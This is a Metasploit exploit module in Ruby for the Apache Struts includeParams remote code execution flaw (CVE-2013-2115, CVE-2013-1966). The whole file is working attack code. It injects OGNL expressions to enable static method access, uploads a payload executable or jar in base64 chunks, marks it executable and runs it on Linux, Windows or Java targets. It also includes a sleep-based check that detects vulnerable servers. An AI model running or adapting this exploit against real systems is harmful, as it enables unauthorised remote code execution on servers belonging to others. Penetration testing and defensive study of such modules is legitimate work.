# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts includeParams Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote command execution vulnerability in Apache Struts
        versions < 2.3.14.2. A specifically crafted request parameter can be used to inject
        arbitrary OGNL code into the stack bypassing Struts and OGNL library protections.
        When targeting an action which requires interaction through GET the payload should
        be split having into account the uri limits. In this case, if the rendered jsp has
        more than one point of injection, it could result in payload corruption. It should
        happen only when the payload is larger than the uri length.
      },
      &#039;Author&#039;         =>
        [
          # This vulnerability was also discovered by unknown members of:
          #    &#039;Coverity security Research Laboratory&#039;
          #    &#039;NSFOCUS Security Team&#039;
          &#039;Eric Kobrin&#039;, # Vulnerability Discovery
          &#039;Douglas Rodrigues&#039;, # Vulnerability Discovery
          &#039;Richard Hicks <scriptmonkey.blog[at]gmail.com>&#039; # Metasploit Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-2115&#039;],
          [ &#039;CVE&#039;, &#039;2013-1966&#039;],
          [ &#039;OSVDB&#039;, &#039;93645&#039;],
          [ &#039;URL&#039;, &#039;https://cwiki.apache.org/confluence/display/WW/S2-014&#039;],
          [ &#039;URL&#039;, &#039;http://struts.apache.org/development/2.x/docs/s2-013.html&#039;]
        ],
      &#039;Platform&#039;      => [ &#039;win&#039;, &#039;linux&#039;, &#039;java&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [&#039;Linux Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;Java Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;java&#039;
            },
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;May 24 2013&#039;,
      &#039;DefaultTarget&#039; => 2))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;PARAMETER&#039;,[ true, &#039;The parameter to use for the exploit (does not have to be an expected one).&#039;,rand_text_alpha_lower(4)]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable struts application action&#039;, "/struts2-blank/example/HelloWorld.action"]),
        OptEnum.new(&#039;HTTPMETHOD&#039;, [ true, &#039;Which HTTP Method to use, GET or POST&#039;,&#039;POST&#039;, [&#039;GET&#039;,&#039;POST&#039;]]),
        OptInt.new(&#039;CHECK_SLEEPTIME&#039;, [ true, &#039;The time, in seconds, to ask the server to sleep while check&#039;, 5])
      ], self.class)
  end

  def execute_command(cmd, opts = {})
    inject_string = @inject.gsub(/CMD/,cmd)
    uri = normalize_uri(target_uri.path)
    req_hash = {&#039;uri&#039; => uri, &#039;version&#039; => &#039;1.1&#039;, &#039;method&#039; => datastore[&#039;HTTPMETHOD&#039;] }
    case datastore[&#039;HTTPMETHOD&#039;]
      when &#039;POST&#039;
        req_hash.merge!({ &#039;vars_post&#039; => { datastore[&#039;PARAMETER&#039;] => inject_string }})
      when &#039;GET&#039;
        req_hash.merge!({ &#039;vars_get&#039; => { datastore[&#039;PARAMETER&#039;] => inject_string }})
    end

    # Display a nice "progress bar" instead of message spam
    case @notify_flag
    when 0
      print_status("Performing HTTP #{datastore[&#039;HTTPMETHOD&#039;]} requests to upload payload")
      @notify_flag = 1
    when 1
      print(".") # Progress dots
    when 2
      print_status("Payload upload complete")
    end

    return send_request_cgi(req_hash) #Used for check function.
  end

  def exploit
    #initialise some base vars
    @inject = "${#_memberAccess[\"allowStaticMethodAccess\"]=true,CMD}"
    @java_upload_part_cmd = "#f=new java.io.FileOutputStream(&#039;FILENAME&#039;,APPEND),#f.write(new sun.misc.BASE64Decoder().decodeBuffer(&#039;BUFFER&#039;)), #f.close()"
    #Set up generic values.
    @payload_exe = rand_text_alphanumeric(4+rand(4))
    pl_exe = generate_payload_exe
    append = false
    #Now arch specific...
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      @payload_exe = "/tmp/#{@payload_exe}"
      chmod_cmd = "@java.lang.Runtime@getRuntime().exec(\"/bin/sh_-c_chmod +x #{@payload_exe}\".split(\"_\"))"
      exec_cmd = "@java.lang.Runtime@getRuntime().exec(\"/bin/sh_-c_#{@payload_exe}\".split(\"_\"))"
    when &#039;java&#039;
      @payload_exe << ".jar"
      pl_exe = payload.encoded_jar.pack
      exec_cmd = ""
      exec_cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdkChecked&#039;),"
      exec_cmd << "#q.setAccessible(true),#q.set(null,true),"
      exec_cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdk15&#039;),"
      exec_cmd << "#q.setAccessible(true),#q.set(null,false),"
      exec_cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(&#039;#{@payload_exe}&#039;).toURI().toURL()}),"
      exec_cmd << "#c=#cl.loadClass(&#039;metasploit.Payload&#039;),"
      exec_cmd << "#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)}).invoke("
      exec_cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
    when &#039;windows&#039;
      @payload_exe = "./#{@payload_exe}.exe"
      exec_cmd = "@java.lang.Runtime@getRuntime().exec(&#039;#{@payload_exe}&#039;)"
    else
      fail_with(Exploit::Failure::NoTarget, &#039;Unsupported target platform!&#039;)
    end

    print_status("Preparing payload...")
    # Now with all the arch specific stuff set, perform the upload.
    # Need to calculate amount to allocate for non-dynamic parts of the URL.
    # Fixed strings are tokens used for substitutions.
    append_length = append ? "true".length : "false".length # Gets around the boolean/string issue
    sub_from_chunk = append_length + ( @java_upload_part_cmd.length - "FILENAME".length - "APPEND".length - "BUFFER".length )
    sub_from_chunk += ( @inject.length - "CMD".length ) + @payload_exe.length + normalize_uri(target_uri.path).length + datastore[&#039;PARAMETER&#039;].length
    case datastore[&#039;HTTPMETHOD&#039;]
      when &#039;GET&#039;
        chunk_length = 2048 - sub_from_chunk # Using the max request length of 2048 for IIS, subtract all the "static" URL items.
        #This lets us know the length remaining for our base64&#039;d payloads
        chunk_length = ((chunk_length/4).floor)*3
      when &#039;POST&#039;
        chunk_length = 65535 # Just set this to an arbitrarily large value, as its a post request we don&#039;t care about the size of the URL anymore.
    end
    @notify_flag = 0
    while pl_exe.length > chunk_length
      java_upload_part(pl_exe[0,chunk_length],@payload_exe,append)
      pl_exe = pl_exe[chunk_length,pl_exe.length - chunk_length]
      append = true
    end
    java_upload_part(pl_exe,@payload_exe,append)
    execute_command(chmod_cmd) if target[&#039;Platform&#039;] == &#039;linux&#039;
    print_line() # new line character, after progress bar.
    @notify_flag = 2 # upload is complete, next command we&#039;re going to execute the uploaded file.
    execute_command(exec_cmd)
    register_files_for_cleanup(@payload_exe)
  end

  def java_upload_part(part, filename, append = false)
    cmd = @java_upload_part_cmd.gsub(/FILENAME/,filename)
    append = append ? "true" : "false" # converted for the string replacement.
    cmd = cmd.gsub!(/APPEND/,append)
    cmd = cmd.gsub!(/BUFFER/,Rex::Text.encode_base64(part))
    execute_command(cmd)
  end

  def check
    #initialise some base vars
    @inject = "${#_memberAccess[\"allowStaticMethodAccess\"]=true,CMD}"
    print_status("Performing Check...")
    sleep_time = datastore[&#039;CHECK_SLEEPTIME&#039;]
    check_cmd = "@java.lang.Thread@sleep(#{sleep_time * 1000})"
    t1 = Time.now
    print_status("Asking remote server to sleep for #{sleep_time} seconds")
    response = execute_command(check_cmd)
    t2 = Time.now
    delta = t2 - t1


    if response.nil?
      return Exploit::CheckCode::Safe
    elsif delta < sleep_time
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

end

